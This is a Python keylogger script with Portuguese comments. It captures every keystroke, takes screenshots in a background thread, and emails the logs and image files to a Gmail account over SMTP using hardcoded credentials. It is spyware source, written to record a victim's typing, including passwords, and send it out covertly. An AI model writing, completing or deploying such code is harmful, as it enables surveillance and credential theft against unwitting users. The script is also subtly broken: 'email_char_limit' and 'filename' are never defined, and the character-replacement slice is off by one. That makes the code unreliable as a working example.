import smtplib
import email.message
import time
import threading
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

fullog = ''
words = ''

# Lista para armazenar os nomes dos arquivos de screenshot
screenshot_files = []

# Dicionário de substituição para caracteres acentuados
substitutions = {
}


def on_press(key):
    global words
    global fullog
    global email_char_limit

    try:
        if key == Key.space or key == Key.enter:
            words += ' '
            fullog += words
            words = ''

            if len(fullog) >= email_char_limit:
                send_log()
                fullog = ''
        elif key == Key.shift_l or key == Key.shift_r:
            return
        elif key == Key.backspace:
            words = words[:-1]
        elif hasattr(key, 'char') and key.char is not None:
            words += key.char
        else:
            char = f'{key}'
            char = char[1:-1]
            words += char

        if key == Key.esc:
            return False
    except Exception as e:
        print(f"Error: {e}")

def replace_characters(text):
    for original, replacement in substitutions.items():
        while original in text:
            index = text.find(original)
            if index != -1:
                text = text[:index] + replacement + text[index + len(original) + 1:]
    return text

def capture_screenshot():
    while True:
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        screenshot_files.append(filename)

def send_log():
    global fullog
    try:
        fullog_replaced = replace_characters(fullog)
        print(f"Sending log: {fullog_replaced}")

        msg = MIMEMultipart()
        msg['Subject'] = "Assunto"
        msg['From'] = 'me@gmail.com'
        msg['To'] = 'me@gmail.com'
        password = 'password'

        msg.attach(MIMEText(fullog_replaced, 'plain'))

        # Attach all screenshots
        for filename in screenshot_files:
            with open(filename, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {filename}")
                msg.attach(part)
                attachment.close()

        s = smtplib.SMTP('smtp.gmail.com: 587')
        s.starttls()
        s.login(msg['From'], password)
        s.sendmail(msg['From'], [msg['To']], msg.as_string())
        s.quit()
        print('Email enviado')


    except Exception as e:
        print(f"Erro ao enviar email: {e}")

# Start the screenshot thread
screenshot_thread = threading.Thread(target=capture_screenshot)
screenshot_thread.start()

# Use the pynput library to listen to events
try:
    with Listener(on_press=on_press) as listener:
        listener.join()
except Exception as e:
    print(f"Error in main block: {e}")